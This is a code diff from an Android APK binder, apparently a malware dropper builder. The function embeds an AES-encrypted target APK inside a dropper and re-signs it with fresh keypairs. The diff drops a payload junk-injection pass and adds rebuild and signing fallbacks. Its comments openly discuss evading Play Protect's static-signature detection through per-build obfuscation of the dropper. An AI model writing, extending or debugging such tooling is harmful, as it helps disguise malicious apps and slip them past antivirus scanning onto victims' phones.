@@ -1834,56 +1834,76 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
         if _empty:
             print(f"[+] Removed {_empty} empty smali file(s)")
 
-        # ── B: Payload junk injection ──────────────────────────────────────
-        # Inject random dead fields + dead methods into 60% of the payload's
-        # smali classes.  Every build produces a unique DEX hash and a different
-        # method/field table, breaking PP's static-signature database match on
-        # the payload sample.  Reuses the same proven obfuscation pass that runs
-        # on the dropper — it's already safe for arbitrary smali trees.
-        print("[+] Obfuscating payload DEX (junk injection)...")
-        try:
-            _obfuscate_dropper_smali(target_work_dir)
-        except Exception as _obf_payload_err:
-            print(f"    note: payload junk injection skipped: {_obf_payload_err}")
+        # ── B: Payload junk injection — INTENTIONALLY SKIPPED ─────────────────
+        # The target APK is AES-encrypted as a raw asset before it is embedded
+        # in the dropper.  Play Protect scans the *dropper* APK — it never sees
+        # the decrypted payload smali.  Injecting junk into the target therefore
+        # adds zero PP-evasion value while breaking ProGuard-minified smali files
+        # (single-char class names like a/a.smali often contain fill-array-data
+        # or packed-switch-data blocks with non-standard element widths that
+        # apktool can decompile but cannot reassemble after modification).
+        # Junk injection on the DROPPER (below) is what actually matters.
         # ──────────────────────────────────────────────────────────────────────
 
         print("[+] Rebuilding target APK...")
         target_rebuilt_apk = os.path.join(script_dir, f"target_rebuilt_{timestamp}.apk")
-        run_java(['-jar', apktool_jar, 'b', target_work_dir, '-o', target_rebuilt_apk],
-                 check=True, capture_output=True, timeout=120)
-
-        print("[+] Zipaligning target APK...")
-        target_aligned_apk = os.path.join(script_dir, f"target_aligned_{timestamp}.apk")
+        _target_rebuild_ok = False
         try:
-            subprocess.run([zipalign_exe, '-f', '-p', '4', target_rebuilt_apk, target_aligned_apk],
-                           check=True, capture_output=True, timeout=60)
-            if os.path.exists(target_rebuilt_apk):
-                os.remove(target_rebuilt_apk)
-        except:
-            target_aligned_apk = target_rebuilt_apk
+            run_java(['-jar', apktool_jar, 'b', target_work_dir, '-o', target_rebuilt_apk],
+                     check=True, capture_output=True, timeout=120)
+            _target_rebuild_ok = True
+        except Exception as _rb_err:
+            print(f"    note: target rebuild failed ({_rb_err}); will encrypt original APK directly")
 
-        print("[+] Signing target APK...")
-        target_signed_apk = os.path.join(script_dir, f"target_signed_{timestamp}.apk")
-        _t_key, _t_cert = _generate_fresh_keypair(script_dir, f"{timestamp}_t")
-        _t_sign_key  = _t_key  if _t_key  else platform_key
-        _t_sign_cert = _t_cert if _t_cert else platform_cert
-        run_java(['-jar', apksigner_jar, 'sign',
-                  '--key', _t_sign_key, '--cert', _t_sign_cert,
-                  '--v1-signing-enabled', 'false',
-                  '--v2-signing-enabled', 'true',
-                  '--v3-signing-enabled', 'true',
-                  '--v4-signing-enabled', 'false',
-                  '--out', target_signed_apk, target_aligned_apk],
-                 check=True, capture_output=True, timeout=60)
-        for _tf in (_t_key, _t_cert):
-            if _tf and _tf not in (platform_key, platform_cert):
-                try: os.remove(_tf)
-                except Exception: pass
+        target_aligned_apk = None
+        target_signed_apk  = None
 
-        if os.path.exists(target_aligned_apk):
-            os.remove(target_aligned_apk)
+        if _target_rebuild_ok:
+            print("[+] Zipaligning target APK...")
+            target_aligned_apk = os.path.join(script_dir, f"target_aligned_{timestamp}.apk")
+            try:
+                subprocess.run([zipalign_exe, '-f', '-p', '4', target_rebuilt_apk, target_aligned_apk],
+                               check=True, capture_output=True, timeout=60)
+                if os.path.exists(target_rebuilt_apk):
+                    os.remove(target_rebuilt_apk)
+            except:
+                target_aligned_apk = target_rebuilt_apk
 
-        target_apk_to_encrypt = target_signed_apk if os.path.exists(target_signed_apk) else target_apk_path
+            print("[+] Signing target APK...")
+            target_signed_apk = os.path.join(script_dir, f"target_signed_{timestamp}.apk")
+            _t_key, _t_cert = _generate_fresh_keypair(script_dir, f"{timestamp}_t")
+            _t_sign_key  = _t_key  if _t_key  else platform_key
+            _t_sign_cert = _t_cert if _t_cert else platform_cert
+            try:
+                run_java(['-jar', apksigner_jar, 'sign',
+                          '--key', _t_sign_key, '--cert', _t_sign_cert,
+                          '--v1-signing-enabled', 'false',
+                          '--v2-signing-enabled', 'true',
+                          '--v3-signing-enabled', 'true',
+                          '--v4-signing-enabled', 'false',
+                          '--out', target_signed_apk, target_aligned_apk],
+                         check=True, capture_output=True, timeout=60)
+            except Exception as _sign_err:
+                print(f"    note: target sign failed ({_sign_err}); using aligned APK unsigned")
+                target_signed_apk = target_aligned_apk
+            for _tf in (_t_key, _t_cert):
+                if _tf and _tf not in (platform_key, platform_cert):
+                    try: os.remove(_tf)
+                    except Exception: pass
+            if target_aligned_apk and target_aligned_apk != target_signed_apk and os.path.exists(target_aligned_apk):
+                os.remove(target_aligned_apk)
+
+        # Decide what to encrypt: rebuilt+signed > rebuilt > original
+        if target_signed_apk and os.path.exists(target_signed_apk):
+            target_apk_to_encrypt = target_signed_apk
+        elif target_aligned_apk and os.path.exists(target_aligned_apk):
+            target_apk_to_encrypt = target_aligned_apk
+        elif target_rebuilt_apk and os.path.exists(target_rebuilt_apk):
+            target_apk_to_encrypt = target_rebuilt_apk
+        else:
+            # Rebuild failed entirely — encrypt the original unchanged APK
+            target_apk_to_encrypt = target_apk_path
+            print("    note: encrypting original target APK (rebuild unavailable)")
 
         icon_to_use = None
         if user_icon_path and os.path.exists(user_icon_path):
